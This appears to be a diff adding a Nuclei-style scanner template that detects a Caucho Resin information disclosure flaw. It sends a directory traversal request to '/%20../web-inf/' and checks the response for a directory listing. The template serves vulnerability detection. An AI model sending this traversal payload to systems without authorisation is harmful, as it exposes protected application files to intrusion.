@@ -1,0 +1,21 @@
+id: caucho-resin-info-disclosure
+info:
+  name: Caucho Resin Information Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+
+http:
+  - method: GET
+    path:
+      - "/%20../web-inf/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/ ../web-inf/"
+          - "Directory of /"
